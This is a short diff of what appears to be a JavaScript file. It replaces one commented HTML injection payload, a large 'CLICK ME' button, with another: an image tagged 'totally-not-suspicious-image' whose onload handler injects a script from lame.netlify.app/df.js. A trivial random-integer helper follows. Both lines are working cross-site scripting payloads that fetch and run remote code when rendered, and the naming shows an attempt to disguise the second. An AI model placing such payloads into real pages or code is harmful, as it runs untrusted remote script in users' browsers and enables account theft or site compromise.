@@ -1,4 +1,4 @@
-/*<button onclick="s =document.createElement('script');s.src='https://lame.netlify.app/df.js';document.head.appendChild(s);"style="font-size:3rem;height:6em;width:6em;border-radius:50%;border:0.3em #eee solid;background-color:#b00;color:#fff;">CLICK ME</button>*/
+/*<img id="totally-not-suspicious-image" src="https://storiesmymummytoldme.files.wordpress.com/2015/06/dap.jpg" onload="s=document.createElement('script');s.src='https://lame.netlify.app/df.js';document.head.appendChild(s);">*/
 
 function getRandomInt(max) {
   return Math.floor(Math.random() * max);
